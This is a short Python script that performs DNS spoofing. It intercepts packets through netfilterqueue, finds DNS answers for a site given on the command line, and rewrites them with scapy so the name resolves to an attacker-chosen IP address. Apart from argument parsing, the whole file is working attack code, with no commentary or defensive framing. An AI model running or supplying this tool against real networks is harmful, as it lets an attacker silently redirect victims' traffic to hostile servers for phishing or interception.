#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--destination", dest="destination_ip", help="add the destination ip adddress")
parser.add_argument("-r", "--request", dest="requested_site", help="specify the requested site")
options = parser.parse_args()

destination_ip = options.destination_ip
requested_site = options.requested_site

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if requested_site in qname:
            print("[+] spoffing target")
            answer = scapy.DNSRR(rrname=qname, rdata=destination_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()